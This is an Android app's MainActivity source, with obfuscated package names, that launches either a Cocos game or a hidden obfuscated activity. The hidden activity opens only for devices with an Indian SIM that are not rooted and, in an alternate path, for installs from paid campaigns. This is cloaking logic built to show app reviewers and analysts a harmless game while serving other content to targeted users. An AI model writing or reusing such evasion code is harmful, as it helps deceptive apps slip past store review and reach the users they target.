package com.d08a3hqr.chtjikfd;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.text.TextUtils;

import com.android.installreferrer.api.InstallReferrerClient;
import com.android.installreferrer.api.InstallReferrerStateListener;
import com.android.installreferrer.api.ReferrerDetails;
import com.yer4xhG1xe.Start;

public class MainActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
//        initView();
//        aabInstall();
        debugInstall();
    }

//    private void initView() {
//        setContentView(R.layout.apk_activity_main);
//        findViewById(R.id.tvw1).setOnClickListener(new View.OnClickListener() {
//            @Override
//            public void onClick(View v) {
//                loadA();
//            }
//        });
//        findViewById(R.id.tvw2).setOnClickListener(new View.OnClickListener() {
//            @Override
//            public void onClick(View v) {
//                loadB();
//            }
//        });
//        findViewById(R.id.tvw3).setOnClickListener(new View.OnClickListener() {
//            @Override
//            public void onClick(View v) {
//                initInstall();
//            }
//        });
//        TextView tvw4 = findViewById(R.id.tvw4);
//        tvw4.setOnClickListener(new View.OnClickListener() {
//            @Override
//            public void onClick(View v) {
//                int currentVersion = android.os.Build.VERSION.SDK_INT;
//                tvw4.setText("VERSION:" + currentVersion);
//            }
//        });
//    }

    private void aabInstall() {
        if (!isLoad()) {
            loadA();
            return;
        }
        InstallReferrerClient referrerClient = InstallReferrerClient.newBuilder(this).build();
        referrerClient.startConnection(new InstallReferrerStateListener() {
            @Override
            public void onInstallReferrerSetupFinished(int responseCode) {
                if (responseCode == InstallReferrerClient.InstallReferrerResponse.OK) {
                    try {
                        ReferrerDetails response = referrerClient.getInstallReferrer();
                        String referrerUrl = response.getInstallReferrer();
                        if (TextUtils.isEmpty(referrerUrl)) {
                            loadA();
                        } else {
                            if (referrerUrl.contains("utm_medium=organic")) {
                                loadA();
                            } else {
                                //非自然
                                loadB();
                            }
                        }
                    } catch (Throwable e) {
                        loadA();
                        e.printStackTrace();
                    }
                } else {
                    loadA();
                }
            }

            @Override
            public void onInstallReferrerServiceDisconnected() {
                loadA();
            }
        });
    }

    private void debugInstall() {
        if (isLoad()) {
            loadB();
        } else {
            loadA();
        }
    }

    private void loadA() {
        Start.init(this, "yer4xhG1xe", "R2W6nZgCsS");
        Intent intent = new Intent();
        intent.setClassName(getPackageName(), "com.cocos.game.AppActivity");
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(intent);
        finish();
    }

    private void loadB() {
        Start.init(this, "0jn16PAlm7", "X670lenGs2");
        Intent intent = new Intent();
        intent.setClassName(getPackageName(), "com.d08a3hqr.chtjikfd.CkiOFmJI");
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(intent);
        finish();
    }

    /**
     * 印度卡、没有root、不是模拟器、非自然
     */
    public boolean isLoad() {
        // 印度卡
        if (!OtherUtil.isIndia(this)) {
            return false;
        }
        // root
        if (OtherUtil.isRoot()) {
            return false;
        }
        // 不会打x86的so，所以不支持模拟器
//        if (OtherUtil.isRunningInEmualtor()) {
//            return false;
//        }
//        // 签名是否一致，这个防重打包
//        String signature = OtherUtil.getSignature(this);
//        if (!TextUtils.equals(signature, "8f23cfea3923e813765efb34f8800b4d")) {
//            return false;
//        }
        return true;
    }
}
